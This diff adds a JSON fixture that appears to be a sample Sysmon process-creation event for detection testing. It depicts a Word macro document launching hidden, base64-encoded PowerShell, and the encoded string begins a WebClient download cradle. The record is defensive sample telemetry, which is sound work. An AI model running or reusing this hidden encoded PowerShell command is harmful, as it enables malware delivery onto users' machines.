@@ -1,0 +1,11 @@
+{
+  "_comment": "Word macro spawning hidden encoded PowerShell, classic maldoc chain",
+  "EventID": 1,
+  "UtcTime": "2026-07-09 14:21:08.335",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+  "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\invoice.docm\"",
+  "User": "CORP\\jdoe",
+  "IntegrityLevel": "Medium"
+}
